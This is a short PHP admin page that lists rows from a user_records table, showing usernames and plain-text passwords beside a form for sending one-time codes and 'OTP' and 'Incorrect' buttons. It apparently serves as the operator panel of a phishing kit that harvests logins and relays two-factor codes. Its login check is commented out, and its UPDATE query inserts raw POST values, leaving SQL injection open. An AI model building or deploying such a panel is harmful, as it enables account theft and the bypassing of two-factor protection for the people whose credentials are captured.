<?php
  // session_start();
  // if (isset($_SESSION['adminuid'])) {
  //   $adminuid = $_SESSION['adminuid'];
  // }else{
  //   header("location:index.php");
  // }
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Admin</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="container">
  <h2>Admin Results</h2>          
  <table class="table table-striped">
    <thead>
      <tr>
        <th>#</th>
        <th>Username</th>
        <th>Password</th>
        <th>otp</th>
        <th colspan="2">Action</th>
      </tr>
    </thead>
    <tbody id="">
      <?php
      require("../db_connect.php");
      $query = mysqli_query($conn, "SELECT * FROM user_records ORDER BY id DESC");
        if (mysqli_num_rows($query)<1) {
          echo "<tr><td>N/A</td></tr>";
        }else{
          $x=1;
          while ($row = mysqli_fetch_object($query)) {
            $data=$row;
            ?>
            <tr>
              <td><?php echo $x; ?></td>
              <td><?php echo $data->username; ?></td>
              <td><?php echo $data->password; ?></td>
              <td>
                <form action="" method="post">
                  <input type="hidden" name="uid" readonly value="<?php echo $data->uid; ?>">
                  <input type="text" name="code" required>
                  <td><input type="submit" class="btn btn-primary" value="Send Code" name="myotp"></td>
                </form>
              </td>
              <td><a class="btn btn-warning" href="edit.php?otp=<?php echo $data->uid?>">OTP</a></td>
              <td><a class="btn btn-danger" href="edit.php?err=<?php echo $data->uid?>">Incorrect</a></td>
            </tr>
            <?php
            $x++;
          }
        }
      ?>
    </tbody>
  </table>
</div>
<?php 
  if (isset($_POST["myotp"])) {
    $code = $_POST['code'];
    $myid = $_POST['uid'];
    $upd = mysqli_query($conn, "UPDATE user_records SET mycode='$code' WHERE uid='$myid'");
    if ($upd) {
      echo "success";
    }
  }
?>
</body>
</html>
<script type="text/javascript">
//   $(document).ready(function() {

//     $("#rs").load('load.php');
//   setInterval(function() {
//     $("#rs").load('load.php')
//   }, 2000);
// });
</script>